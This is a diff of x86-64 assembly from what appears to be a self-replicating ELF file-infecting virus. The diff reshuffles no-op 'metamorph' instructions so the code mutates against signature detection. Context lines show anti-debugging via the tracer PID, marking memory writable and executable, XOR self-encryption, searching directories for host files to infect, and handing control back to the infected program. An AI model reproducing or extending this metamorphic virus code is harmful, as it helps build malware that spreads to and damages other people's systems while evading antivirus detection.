@@ -68,6 +68,7 @@ _h3ll0w0rld:
 		nop
 		nop
 		nop
+		add rsi, 0x0; metamorph
 
 		jmp $+6
 		db `\x42\x42\x42\x42`; TRASH ; 42; 42; mov rdi,
@@ -93,7 +94,6 @@ _h3ll0w0rld:
 		jmp $+4
 		db `\x48\x8d`; TRASH ; lea rax, rcx
 
-		add rax, 0x0
 		mov rax, 0; SYSCALL READ
 		nop
 		syscall
@@ -104,9 +104,9 @@ _h3ll0w0rld:
 		push rdi
 		push rsi
 		pop rdi
+		add rdi, 0x0; metamorph
 		push rax
 		pop rsi
-		or r15, 0x0 ; metamorph
 
 		lea rdx, [rel tracer_pid]
 
@@ -124,7 +124,6 @@ _h3ll0w0rld:
 		jmp $+5
 		db `\x58\x48\xbf`; TRASH
 
-		and rdi, -1 ; metamorph
 		pop rdi
 		push rax
 		mov rax, SYSCALL_CLOSE
@@ -157,34 +156,32 @@ _h3ll0w0rld:
 		push rdx
 		lea rdi, [rel _start]
 		mov rsi, [rel entry_inject]
-		add rax, 0x0 ; metamorph
 		sub rdi, rsi
+		add rdi, 0x0; metamorph
 		sub rsi, 8 * 3
 		add rsi, [rel length]
-		add rsi, 0x0 ; metamorph
 		push 0x7
 		nop
 		pop rdx ; PROT_READ | PROT_WRITE | PROT_EXEC
 		nop
+		add rax, 0x0; metamorph
 		mov rax, SYSCALL_MPROTECT; mprotect
 		syscall; change protect from file to _eof
 
 		lea rdi, [rel fingerprint]
-		and rax, -1 ; metamorph
 		call _ft_strlen
-		and rdx, -1 ; metamorph
 		push rax
 		pop rcx
 		push rdi
 
 		lea rdi, [rel _virus]
 		mov rdx, rdi
-		or rdx, 0x0 ; metamorph
 		lea rsi, [rel _params]
 		sub rdx, rsi
 		mov rsi, [rel length]
 		sub rsi, rdx ; length - (_virus - _params)
 		add rsi, 0x0 ; metamorph
+		or rdx, 0x0 ; metamorph
 		pop rdx
 
 		call _xor_encrypt
@@ -192,16 +189,16 @@ _h3ll0w0rld:
 		lea rdx, [rel _h3ll0w0rld]
 		mov rcx, KEY_SIZE
 		call _xor_encrypt
-		add rdx, 0x0 ; metamorph
 		pop rdx
+		add rdx, 0x0 ; metamorph
 
 	jmp .ft_juggling + 5; jmp on eb 24 -> jmp .infected
 	.happy_mix:
+	add r15, 0x0 ; metamorph
 	push 2
 	nop
 	pop rdi
 	nop
-	add r15, 0x0 ; metamorph
 	lea rsi, [rel debugging]
 	jmp $+6
 	db `\x48\xb8\x13\x37`
@@ -238,9 +235,9 @@ _h3ll0w0rld:
 	add r8, 0x0 ; metamorph
 	mov rax, 0
 	nop
-	and r8, -1 ; metamorph
 	cmp rax, [rel entry_inject]; if entry_inject isn't set we are in host
 	jnz .code ; .xor_decrypt
+	and r8, -1 ; metamorph
 	; copy the prg in memory and launch it cmp rax, [rel entry_inject]; if entry_inject isn't set we are in host
 
 	.host:
@@ -254,9 +251,7 @@ _h3ll0w0rld:
 
 	; host part
 	call _make_virus_map
-	add r8, 0x0 ; metamorph
 	call _search_dir
-	and r8, -1 ; metamorph
 	call _munmap_virus
 
 	jmp _exit
@@ -515,14 +510,13 @@ _virus:
 
 _prg:
 	; end infected file
+	or rax, 0x0; metamorph
 	push r8
 	pop rax
 
-	or rax, 0x0; metamorph
 
 	sub rax, [rel entry_inject]
 	add rax, [rel entry_prg]
-	add rax, 0x0; metamorph
 
 	; jmp on entry_prg
 	jmp rax
